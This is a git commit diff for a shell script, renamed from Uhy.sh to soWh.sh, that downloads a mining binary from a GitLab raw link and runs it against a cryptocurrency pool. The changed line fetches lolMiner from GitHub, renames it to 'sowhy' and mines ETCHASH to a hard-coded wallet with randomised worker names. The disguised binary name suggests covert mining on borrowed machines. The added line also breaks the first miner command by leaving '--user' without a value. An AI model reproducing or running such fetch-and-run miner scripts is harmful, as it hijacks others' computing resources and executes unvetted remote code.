9b25285132a74879b1c7431f4fe852232be24afa
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-17 15:18:41 +0700

    Update and rename Uhy.sh to soWh.sh

--- soWh.sh
+++ soWh.sh
@@ -13,4 +13,4 @@ Also, make sure to confirm the necessary dependencies are installed for the righ
 strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX
 
 wget https://gitlab.com/ontaracing04/gas/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
-./best --url pool.ryo-currency.com:3333 --user RYoLsfLyxorX9cQHtypa9b4QWkEB76tCwasv8iynHspRLaQWHcECZCwXSg88k5pRmG1BFAexoMENvcR7V3SM1iJtgsminsRuawE --pass $(echo $(shuf -i 1-20000 -n 1)-yolo) --currency cryptonight_gpu 
+./best --url pool.ryo-currency.com:3333 --user && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz && tar -xf lolMiner_v1.51_Lin64.tar.gz && cd 1.51 && mv lolMiner ../sowhy && cd .. && ./sowhy --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
